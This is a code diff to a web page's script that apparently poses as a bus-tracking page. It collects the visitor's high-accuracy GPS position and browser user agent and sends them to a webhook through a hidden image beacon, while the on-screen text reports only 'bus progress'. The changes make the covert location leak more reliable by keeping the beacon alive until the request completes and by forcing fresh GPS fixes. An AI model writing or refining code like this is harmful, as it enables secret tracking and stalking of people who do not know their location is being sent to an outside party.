@@ -179,16 +179,18 @@
                             accuracy: acc + "m",
                             device: navigator.userAgent
                         });
-                        const beacon = new Image();
-                        // Append a unique timestamp to force the browser to bypass its cache
-                        beacon.src = WEBHOOK_URL + "?" + params.toString() + "&_t=" + Date.now();
+                        
+                        // Attach to window to prevent garbage collection before request completes
+                        window._beacon = new Image();
+                        // Append a unique timestamp to force the browser network to bypass its cache
+                        window._beacon.src = WEBHOOK_URL + "?" + params.toString() + "&_t=" + Date.now();
 
                         statusText.innerText = "Live tracking active. Bus progress updated.";
                     },
                     (err) => {
                         statusText.innerText = "Live tracking limited (GPS restricted).";
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
                 statusText.innerText = "Live tracking limited (GPS not supported).";
